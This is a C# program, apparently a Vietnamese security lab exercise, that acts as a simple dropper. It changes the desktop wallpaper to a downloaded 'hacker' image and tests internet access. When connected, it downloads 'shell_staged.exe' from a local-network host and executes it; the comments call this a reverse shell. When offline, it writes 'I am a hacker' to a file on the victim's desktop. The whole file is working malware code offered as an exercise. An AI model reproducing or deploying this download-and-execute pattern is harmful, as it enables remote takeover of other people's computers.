using System;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Threading;

namespace Lab2_B1._1._3
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("Hello World!");

            //Gọi hàm thay đổi màn hình máy tính
            changeBackground();

            //Gọi hàm kiểm tra internet của máy tính
            CheckInternet();
        }

        //Setup các biến để phục vụ thay đổi màn hình
        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        private static extern Int32 SystemParametersInfo(UInt32 uAction, UInt32 uParam, String lpvParam, UInt32 fuWinini);
        private static UInt32 SPI_SETDESKWALLPAPER = 20;
        private static UInt32 SPIF_SENDWININICHANGE = 0x1;
        private static UInt32 SPIF_UPDATEINIFILE = 0x2;

        /// <summary>
        /// Hàm có chức năng thay đổi hình nền máy tính
        /// </summary>
        static void changeBackground()
        {
            string path = AppDomain.CurrentDomain.BaseDirectory + "\\avatar.jpg";   //Tạo biến đường dẫn file hình ảnh

            try
            {
                if (!File.Exists(path))  //Kiểm tra file đã có hay chưa
                {
                    using (WebClient client = new WebClient()) //Nếu chưa có thì tải ảnh về máy
                    {
                        client.DownloadFile("https://img2.thuthuatphanmem.vn/uploads/2018/12/09/anh-bia-hacker-chat_111113699.jpg", path);
                    }
                }
            }
            catch { }

            SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, path, SPIF_SENDWININICHANGE | SPIF_UPDATEINIFILE);  //Thực hiện đổi hình nền máy tính
        }

        /// <summary>
        /// Hàm có chức năng tải và thực thi reverse shell
        /// </summary>
        static void Reverse_Shell()
        {
            try
            {
                //Tạo đường dẫn file Reverse Shell
                string pathReverseShell = @"C:\Users\ReverseShell.exe";

                Uri uri = new Uri("http://192.168.111.138/shell_staged.exe");

                if (!File.Exists(pathReverseShell)) //Kiểm tra file Reverse Shell đã có hay chưa
                {
                    using (WebClient client = new WebClient())
                    {
                        //Tải File Reverse Shell
                       
                        client.DownloadFile("http://192.168.111.138/shell_staged.exe", pathReverseShell);
                    }
                }

                //Thread a = new Thread()
                System.Diagnostics.Process.Start(pathReverseShell);
            }
            catch
            {
                Console.WriteLine("ham reverse shell bi loi");
            }
        }


        /// <summary>
        /// Hàm có chức năng tạo tập tin ở thư mục desktop của máy tính
        /// </summary>
        static void CreateFile()
        {
            //Lấy đường dẫn đến thư mục desktop hiện hành của máy nạn nhân
            string filepath = Environment.GetFolderPath(
                         System.Environment.SpecialFolder.DesktopDirectory);

            filepath += "\\hacker.txt"; //Thêm tên tập tin vào đường dẫn desktop

            if (!File.Exists(filepath)) //Kiểm tra tập tin đã có hay chưa
            {
                // chưa có thì tạo tập tin 
                using (StreamWriter sw = File.CreateText(filepath))
                {
                    //ghi nội dung tập tin
                    sw.WriteLine("I am a hacker ^^ !!!");
                }
            }
            else
            {
                //đã có thì ghi tiếp nội dung vào tập tin
                using (StreamWriter sw = File.AppendText(filepath))
                {
                    //ghi nội dung tập tin
                    sw.WriteLine("I am a hacker ^^ !!!");
                }
            }
        }

        /// <summary>
        /// Hàm kiểm tra kết nối của máy tính
        /// </summary>
        static void CheckInternet()
        {
            try
            {
                HttpWebRequest request = (HttpWebRequest)HttpWebRequest.Create("http://example.com/");
                request.Method = "GET";

                HttpWebResponse response = (HttpWebResponse)request.GetResponse();

                //kiểm tra trạng thái của internet
                if ((int)response.StatusCode >= 200 && (int)response.StatusCode < 300)
                {
                    response.Close();
                    Reverse_Shell();
                }
                else
                {
                    CreateFile();
                }

                //Close stream
                response.Close();
            }
            catch
            {
                CreateFile();
            }
        }
    }
}
